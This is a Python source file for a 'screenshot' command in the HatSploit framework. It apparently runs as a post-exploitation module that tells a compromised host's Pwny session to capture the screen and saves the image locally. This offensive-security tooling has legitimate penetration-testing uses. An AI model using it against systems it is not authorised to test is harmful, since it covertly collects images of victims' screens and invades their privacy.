"""
This command requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from pwny.api import *
from pwny.types import *

from hatsploit.lib.command import Command

UI_BASE = 6

UI_SCREENSHOT = tlv_custom_tag(API_CALL_STATIC, UI_BASE, API_CALL + 12)


class HatSploitCommand(Command):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "gather",
            'Name': "screenshot",
            'Authors': [
                'Ivan Nikolsky (enty8080) - command developer'
            ],
            'Description': "Take screenshot.",
            'Usage': "screenshot <local_path>",
            'MinArgs': 1,
        }

    def run(self, argc, argv):
        result = self.session.send_command(tag=UI_SCREENSHOT)

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error("Failed to take screenshot!")
            return

        with open(argv[1], 'wb') as f:
            f.write(result.get_raw(TLV_TYPE_BYTES))
